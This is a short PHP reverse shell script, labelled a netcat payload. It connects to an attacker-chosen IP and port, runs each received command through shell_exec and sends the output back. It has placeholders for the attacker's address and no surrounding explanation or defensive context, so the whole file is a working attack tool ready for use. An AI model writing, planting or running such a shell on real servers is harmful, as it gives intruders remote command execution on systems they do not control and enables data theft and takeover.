<?php
// Netcat Reverse Shell Payload
$ip = '<attacker-ip>';  // Replace with your IP
$port = '<attacker-port>';  // Replace with the port you will listen on

$socket = fsockopen($ip, $port);
if ($socket) {
    while ($cmd = fgets($socket, 1024)) {
        $output = shell_exec($cmd);
        fwrite($socket, $output);
    }
}
?>

